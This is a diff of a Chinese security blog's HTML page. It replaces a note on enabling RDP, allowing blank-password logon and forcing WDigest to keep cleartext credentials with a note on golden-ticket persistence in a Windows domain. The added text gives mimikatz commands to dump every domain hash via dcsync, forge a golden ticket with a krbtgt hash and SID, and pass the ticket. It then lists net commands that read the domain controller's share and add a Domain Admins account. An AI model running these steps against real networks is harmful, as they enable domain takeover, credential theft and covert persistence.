@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>3389相关 | Hexo</title>
+  <title>权限维持 黄金票据 | Hexo</title>
   <meta name="keywords" content="">
-  <meta name="description" content="3389相关 | Hexo">
+  <meta name="description" content="权限维持 黄金票据 | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="导出ntml hash在域控使用mimikatz 导出 ntml hash mimikatz   log  “lsadump::dcsync &#x2F;domain:zn.com &#x2F;all” 制作黄金票据清除票据klist purge #在cmd中执行 mimikatzprivilege::Debugkerberos::purgekerberos::list 制作票据kerberos::golden  &#x2F;">
 <meta property="og:type" content="article">
@@ -461,9 +461,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-开启3389" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-权限维持-黄金票据" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">3389相关</h1>
+        <h1 class="article-title">权限维持 黄金票据</h1>
     
     <div class="article-meta">
         
@@ -481,7 +481,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2023-03-05 23:17:19'>2023-03-05 23:08</time>
+            Created At : <time class="date" title='Updated At: 2023-08-04 00:21:13'>2023-08-03 22:36</time>
         
     </div>
     <div class="article-meta">
@@ -503,7 +503,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AF3389"><span class="toc-text">开启3389</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E5%AF%86%E7%A0%81%E8%BF%9E%E6%8E%A5"><span class="toc-text">空密码连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E4%BF%9D%E5%AD%98%E5%88%B0%E5%86%85%E5%AD%98%E4%B8%AD"><span class="toc-text">明文密码保存到内存中</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BC%E5%87%BAntml-hash"><span class="toc-text">导出ntml hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-text">制作黄金票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%85%E9%99%A4%E7%A5%A8%E6%8D%AE"><span class="toc-text">清除票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E7%A5%A8%E6%8D%AE"><span class="toc-text">制作票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E7%A5%A8%E6%8D%AE"><span class="toc-text">导入票据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-text">添加域管理员</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -519,11 +519,18 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="开启3389"><a href="#开启3389" class="headerlink" title="开启3389"></a>开启3389</h3><p>reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f<br>reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp” /v PortNumber /t REG_DWORD /d 3389 /f<br>reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /v PortNumber /t REG_DWORD /d 3389 /f</p>
-<h3 id="空密码连接"><a href="#空密码连接" class="headerlink" title="空密码连接"></a>空密码连接</h3><p>reg add “HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Lsa” /v LimitBlankPasswordUse /t reg_dword /d 0 /f</p>
-<h3 id="明文密码保存到内存中"><a href="#明文密码保存到内存中" class="headerlink" title="明文密码保存到内存中"></a>明文密码保存到内存中</h3><p>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</p>
-<p>server 同一用户多端登陆</p>
-<p> reg add “HKLM\System\CurrentControlSet\Control\Terminal Server” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</p>
+        <h2 id="导出ntml-hash"><a href="#导出ntml-hash" class="headerlink" title="导出ntml hash"></a>导出ntml hash</h2><p>在域控使用mimikatz 导出 ntml hash</p>
+<p>mimikatz   log  “lsadump::dcsync /domain:zn.com /all”</p>
+<h2 id="制作黄金票据"><a href="#制作黄金票据" class="headerlink" title="制作黄金票据"></a>制作黄金票据</h2><h3 id="清除票据"><a href="#清除票据" class="headerlink" title="清除票据"></a>清除票据</h3><p>klist purge #在cmd中执行</p>
+<p>mimikatz<br>privilege::Debug<br>kerberos::purge<br>kerberos::list</p>
+<h3 id="制作票据"><a href="#制作票据" class="headerlink" title="制作票据"></a>制作票据</h3><p>kerberos::golden  /user:Administrator  /domain:zn.com /sid:S-1-5-21-1377699071-2646614574-1515251635 /krbtgt:1f17c8164c5085d014e8f3161f50eec5  /ticket:1.kirbi</p>
+<h3 id="导入票据"><a href="#导入票据" class="headerlink" title="导入票据"></a>导入票据</h3><p>kerberos::ptt 1.kirbi<br>lsadump::dcsync /domain:zn.com  /all</p>
+<p>dir  \WIN-ROTLQJUNHDJ.zn.com\c$</p>
+<p><img src="./images/image-20230804002044085.png" alt="image-20230804002044085"></p>
+<h4 id="添加域管理员"><a href="#添加域管理员" class="headerlink" title="添加域管理员"></a>添加域管理员</h4><p>在cifs 之后</p>
+<p>net user zs 1231231.a /add /domain  添加域用户</p>
+<p>net group “Domain Admins” admin11 /add /domain 添加到域管组</p>
+<p><img src="./images/image-20230804002058026.png" alt="image-20230804002058026"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
